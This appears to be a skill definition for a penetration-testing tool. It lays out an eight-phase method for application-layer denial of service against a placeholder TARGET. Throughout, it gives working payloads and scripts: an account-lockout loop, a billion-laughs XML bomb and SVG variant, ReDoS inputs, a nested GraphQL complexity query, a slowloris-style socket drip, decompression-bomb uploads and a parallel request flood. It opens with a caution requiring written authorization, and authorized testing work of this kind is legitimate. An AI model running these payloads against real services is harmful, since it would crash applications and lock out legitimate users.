---
name: attack-dos
description: "Application-layer Denial of Service — resource exhaustion, algorithmic complexity (ReDoS), XML/GraphQL bombs, account lockout abuse, and slow-request attacks"
category: "web-application"
version: "1.0"
author: "cyberstrike-official"
tags:
  - dos
  - denial-of-service
  - redos
  - xml-bomb
  - resource-exhaustion
  - attack
tech_stack:
  - web
  - xml
  - graphql
  - regex
cwe_ids:
  - CWE-400
  - CWE-770
  - CWE-1333
chains_with:
  - wstg-inpv-07
  - attack-race-condition
prerequisites: []
severity_boost:
  wstg-inpv-07: "XML input handling confirmed vulnerable by WSTG-INPV-07 = billion-laughs/XXE-DoS chain with memory exhaustion"
  attack-race-condition: "Combine resource-exhaustion timing windows with race conditions to bypass rate limiting or duplicate costly operations"
---

# Denial of Service (Application Layer)

## Objective

Degrade or crash the target application by exhausting server-side resources (memory, CPU, disk, file descriptors, worker threads) through malicious payloads or abuse of business logic, without relying on network-volumetric flooding.

**CAUTION**: DoS testing is high-impact and frequently out-of-scope. Confirm explicit written authorization for DoS/stress testing before running anything in this skill against a target, and prefer testing against a staging/lab clone first.

## Testing Methodology

### Phase 1: Account Lockout / Login Abuse (Business DoS)

```bash
# Confirm lockout threshold, then verify an attacker can lock out arbitrary victims
# by supplying only their known username/email with wrong passwords
for i in $(seq 1 20); do
  curl -s -o /dev/null -w "%{http_code}\n" -X POST "https://TARGET/login" \
    -d "username=victim@target.com&password=wrong_$i"
done
# If account gets locked after N attempts, ANY unauthenticated user can lock out
# a known victim indefinitely -> report as business-logic DoS (WSTG-side note)
```

### Phase 2: XML Billion Laughs / Entity Expansion Bomb

```xml
<?xml version="1.0"?>
<!DOCTYPE lolz [
 <!ENTITY lol "lol">
 <!ELEMENT lolz (#PCDATA)>
 <!ENTITY lol1 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
 <!ENTITY lol2 "&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;">
 <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
 <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
 <!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;">
 <!ENTITY lol6 "&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;">
 <!ENTITY lol7 "&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;">
 <!ENTITY lol8 "&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;">
 <!ENTITY lol9 "&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;">
]>
<lolz>&lol9;</lolz>
```

```bash
curl -s -X POST "https://TARGET/api/xml-endpoint" \
  -H "Content-Type: application/xml" --data-binary @billion_laughs.xml \
  -w "\nHTTP:%{http_code} TIME:%{time_total}s\n" --max-time 15
```

### Phase 3: SVG Bomb (XML-Based Image Upload)

```bash
# SVG is XML — the same entity-expansion bomb works if the app renders/parses
# uploaded SVGs (avatar upload, logo upload)
cp billion_laughs.xml svg_bomb.svg
sed -i '1a <svg xmlns="http://www.w3.org/2000/svg"><text>&lol9;</text></svg>' svg_bomb.svg
curl -s -X POST "https://TARGET/api/upload-avatar" -F "file=@svg_bomb.svg;type=image/svg+xml"
```

### Phase 4: ReDoS (Regular Expression DoS)

```bash
# Classic catastrophic-backtracking patterns: test any field validated by regex
# (email, phone, username format) with crafted evil-input strings

# Evil input for (a+)+$ / (a|a)*$ style patterns — many chars then a non-matching char
python3 -c "print('a'*40 + '!')" > redos_input.txt

curl -s -X POST "https://TARGET/api/validate-email" \
  -H "Content-Type: application/json" \
  --data "{\"email\":\"$(python3 -c "print('a'*35 + '@' + 'a'*35 + '.com!')")\"}" \
  -w "\nTIME:%{time_total}s\n" --max-time 20

# Time the request — if response time grows exponentially with input length,
# you have a ReDoS. Confirm by doubling the 'a' count and measuring blowup.
for n in 20 25 30 35; do
  payload=$(python3 -c "print('a'*$n + '!')")
  /usr/bin/time -f "%e sec for n=$n" curl -s -o /dev/null \
    -X POST "https://TARGET/api/validate" --data "field=$payload" 2>&1 | tail -1
done
```

### Phase 5: Deeply-Nested GraphQL Query (Complexity Bomb)

```graphql
query {
  repository(owner: "rails", name: "rails") {
    assignableUsers(first: 100) {
      nodes {
        repositories(first: 100) {
          nodes {
            issues(first: 100) {
              nodes {
                comments(first: 100) {
                  nodes { author { login } }
                }
              }
            }
          }
        }
      }
    }
  }
}
```

```bash
curl -s -X POST "https://TARGET/graphql" -H "Content-Type: application/json" \
  --data "$(python3 -c 'import json; print(json.dumps({"query": open("nested_query.graphql").read()}))')" \
  -w "\nTIME:%{time_total}s\n" --max-time 30
```

### Phase 6: Slow POST / Slowloris-Style Application Layer

```bash
# Slow header/body drip to exhaust worker threads/connections (app-layer, low BW)
python3 - <<'EOF'
import socket, time
TARGET_HOST = "TARGET"
TARGET_PORT = 443
s = socket.create_connection((TARGET_HOST, TARGET_PORT))
s.send(b"POST /upload HTTP/1.1\r\nHost: %s\r\nContent-Length: 1000000\r\n\r\n" % TARGET_HOST.encode())
for _ in range(1000):
    s.send(b"X")
    time.sleep(10)
EOF
```

### Phase 7: Large/Malformed File Upload (Image/Decompression Bomb)

```bash
# Decompression bomb: tiny file, huge decompressed size (zip bomb / pixel-flood image)
dd if=/dev/zero bs=1M count=1 | gzip -9 > tiny.gz  # baseline
# For image resizing services, upload an image with an enormous declared dimension
# in the header but minimal actual pixel data, or a deeply nested/recursive PDF
curl -s -X POST "https://TARGET/api/upload-image" -F "file=@decompression_bomb.zip"
```

### Phase 8: Filesystem Exhaustion

```bash
# If the app writes one file per user action (e.g. per-message attachment, log
# entry, generated report), automate rapid creation to approach inode/size limits
# in a scoped test directory/tenant only — NEVER against shared production storage
for i in $(seq 1 500); do
  curl -s -X POST "https://TARGET/api/generate-report" \
    -H "Authorization: Bearer YOUR_SESSION_TOKEN" -o /dev/null &
done
wait
```

## What Constitutes a Finding

| Finding | Severity |
|---|---|
| Unauthenticated request causes memory/CPU exhaustion or process crash (XML bomb, GraphQL bomb) | Critical (P1) |
| ReDoS on an unauthenticated, unrate-limited endpoint | High (P2) |
| Attacker can lock out arbitrary victim accounts with only their email/username | High (P2) |
| Slow POST / connection exhaustion degrades availability for other users | High (P2) |
| Filesystem/storage exhaustion within a single tenant, no cross-tenant impact | Medium (P3) |
| Resource cost is high but requires authentication + rate limiting is effective | Low (P4) |

## Evidence Requirements

- Request/response timing showing the resource-exhaustion effect (before/after latency, CPU/mem graphs if accessible)
- The exact payload (XML bomb, regex input, GraphQL query) and endpoint used
- Confirmation of service degradation scope (single request, single tenant, or global) — never run to full outage without explicit sign-off
- For account-lockout DoS: proof the victim account become inaccessible using only public identifiers

## Tools

- `curl` with `-w "%{time_total}"` — timing-based confirmation
- `python3` (socket) — slow POST / custom protocol drips
- `attack_script generic_listener` — OOB confirmation where applicable

## References

- [PayloadsAllTheThings: Denial of Service](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Denial%20of%20Service)
- [OWASP Denial of Service Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Denial_of_Service_Cheat_Sheet.html)
- [DEF CON 32 - Practical Exploitation of DoS in Bug Bounty - Roni Lupin Carta](https://youtu.be/b7WlUofPJpU)
